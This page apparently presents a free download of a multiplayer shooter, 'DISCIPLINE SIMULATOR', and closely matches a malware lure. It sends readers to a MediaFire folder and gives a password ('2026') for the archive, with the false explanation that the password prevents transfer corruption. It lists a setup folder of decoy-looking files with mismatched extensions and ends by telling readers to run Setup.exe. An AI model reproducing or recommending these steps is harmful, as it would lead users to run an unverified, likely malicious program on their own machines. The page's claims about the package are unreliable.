## 🕹️ About

DISCIPLINE SIMULATOR is a first-person multiplayer action game from developer DISCIPLINE SIMULATOR and publisher ASI Games. Players compete in online deathmatches and team battles for up to eight players across chaotic arena-style locations. The core loop combines precision shooting, custom target images, weapon gadgets, upgrades, and fast competitive matches. Its exaggerated meme-driven presentation, customizable content, and deliberately over-the-top tone give the game a distinctive identity. This release is packaged for straightforward installation of the complete game.

A fast, chaotic multiplayer experience for players who enjoy arcade shooting, competitive arenas, customization, and irreverent mature humor.

## ✨ Features

- ⚔️ **Online Multiplayer** — Battle in competitive matches supporting up to eight players.
- 🔧 **Weapon Gadgets** — Customize your equipment to improve power, speed, and accuracy.
- 🤝 **Team Deathmatch** — Squad up with friends and fight through frantic team battles.
- 🔥 **Mature Meme Humor** — A deliberately extreme presentation aimed at players who enjoy unconventional comedy.
- 🖼️ **Custom Targets** — Upload your own target images and bring personal motivation into the action.
- 🎯 **Precision Combat** — Turn accuracy, timing, and speed into your biggest advantages.

### Step 1: Download

Download the package from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the setup expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- res.pak <- Resources archive
|-- installer.dat <- Installer data
|-- bootstrap.wem <- Bootstrap audio
|-- patch_1.bnk <- Audio banks
|-- api.pak <- API modules
|-- global.cfg <- Global settings
|-- driver.umap <- Driver data
|-- license.wem <- Audio assets
|-- update_1.res <- Update resources
|-- uninstall.key <- Uninstall key
|-- lang.sys <- Language system
|-- update_1.ini <- Update config
|-- driver.pak <- Driver archive
|-- localization.ini <- Language files
|-- settings.bin <- Configuration
|-- license.bank <- License data
|-- launcher.dll <- Launcher library
|-- dlc.md5 <- DLC checksums
|-- scripts.lic <- Game scripts
|-- physics.sys <- Physics engine
|-- animations.dll <- Animation system
|-- audio.res <- Audio resources
|-- Password 2026.txt <- Password reminder (empty)
|-- assets.wem <- Asset audio
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game will start
